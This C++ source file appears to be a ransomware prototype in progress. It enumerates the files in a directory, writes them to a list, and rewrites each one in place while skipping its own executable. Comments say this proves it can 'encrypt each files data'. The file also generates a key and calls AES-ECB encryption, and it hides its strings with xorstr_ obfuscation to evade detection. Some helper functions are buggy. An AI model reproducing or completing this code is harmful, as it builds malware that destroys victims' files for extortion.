#include "helpers.h"
/*
ios:: app 	The Append mode. The output sent to the file is appended to it.
ios::ate 	It opens the file for the output then moves the read and write control to file’s end.
ios::in 	It opens the file for a read.
ios::out 	It opens the file for a write.
ios::trunc 	If a file exists, the file elements should be truncated prior to its opening.

You can read information from files into your C++ program. This is possible using stream extraction operator (>>).
You use the operator in the same way you use it to read user input from the keyboard.
However, instead of using the cin object, you use the ifstream/ fstream object.

std::string random_string( size_t length )
{
	auto randchar = []() -> char
	{
		const char charset[] =
		"0123456789"
		"ABCDEFGHIJKLMNOPQRSTUVWXYZ"
		"abcdefghijklmnopqrstuvwxyz";
		const size_t max_index = (sizeof(charset) - 1);
		return charset[ rand() % max_index ];
	};
	std::string str(length,0);
	std::generate_n( str.begin(), length, randchar );
	return str;
}
*/
vector<std::byte> getBytes(std::string const& s) {
	std::vector<std::byte> bytes;
	bytes.reserve(std::size(s));
	std::transform(std::begin(s), std::end(s), std::back_inserter(bytes), [](char const& c) {
		return std::byte(c);
		});

	return bytes;
}

// Used to get the filenames of all files present in a directory.
string getAllFiles(string path) {
	string filecollection{}; // stores all results
	for (auto i = fs::directory_iterator(path); i != fs::directory_iterator(); i++)
		if (!fs::is_directory(i->path())) // eliminate directories in a list
			filecollection += i->path().filename().string() + "\n"; // add the filename, then newline
		else continue;

	return filecollection; // return results
}

// Used to read the contents of a file, and then return it----
string OpenReadFile(string path) {
	fstream f; f.open(path, ios::in); // opens file for read
	string result{}; // store the content of file
	if (!f) cout << xorstr_("file dont exist") << endl; // if it isnt present then return message
	else while (1) {
		f >> result;
		if (f.eof()) break;
	}
	f.close();
	return result;
}

// Used to read the contents of a file, and then return it----
void OpenWriteFile(string path, string input) {
	fstream f;
	f.open(path, ios::out); // opens file for read
	if (f.is_open()) // check if its open
		f << input; // write to it

	f.close(); // close it
	return;
}
void GenerateAESkey(string filename, std::size_t len) {
	std::fstream keyFile;
	keyFile.open(testingDir + filename, ios::out); // opens file for read

	auto random = []() -> char {
		const char charset[] = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
		const std::size_t maxindex = sizeof(charset) - 1;
		return charset[rand() % maxindex];
	};

	std::string str(len, 0);
	std::generate_n(str.begin(), len, random);

	std::vector<std::byte> bytes = getBytes(str);

	if (keyFile.is_open())
		for (auto byte : bytes)
			keyFile << std::to_integer<int>(byte) << ',';

	keyFile.close();

	return;
}

void ENCROFILE(string input) {
	unsigned char plain[] = { 0x00, 0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88, 0x99, 0xaa, 0xbb, 0xcc, 0xdd, 0xee, 0xff }; //plaintext example
	unsigned char key[] = { 0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f }; //key example
	unsigned int plainLen = 16 * sizeof(unsigned char);  //bytes in plaintext

	AES aes(AESKeyLength::AES_128);  ////128 - key length, can be 128, 192 or 256
	auto c = aes.EncryptECB(plain, plainLen, key);
}

// Write the found fles to a txt doc
void CreateFileList(string dir, string output) {
	fstream myFile;
	if (OpenReadFile(dir + output) == "") {
		myFile.open(dir + output, ios::out); // opens file for write
		myFile << getAllFiles(dir);
	}
	myFile.close();
}
// adding the encryption part, this is just the base func for proving its concept
void WriteDirectory(string path) {
	fstream fileLog;
	fileLog.open(path + xorstr_("filelist.txt"), ios::in); // open the filelist file
	string fileLine{}; // store the lines here
	if (fileLog.is_open()) while (getline(fileLog, fileLine)) // checks if filelist is open, if so then read each line
		if (fileLine != ourFilename && fileLine != xorstr_("filelist.txt")) // Skip our EXE and the filelist
			OpenWriteFile(path + fileLine, OpenReadFile(path + fileLine) + xorstr_("-tweaked"));// write -tweaked at the end of every file , to prove we can encrypt each files data and write it one by one ...

	fileLog.close();// close
}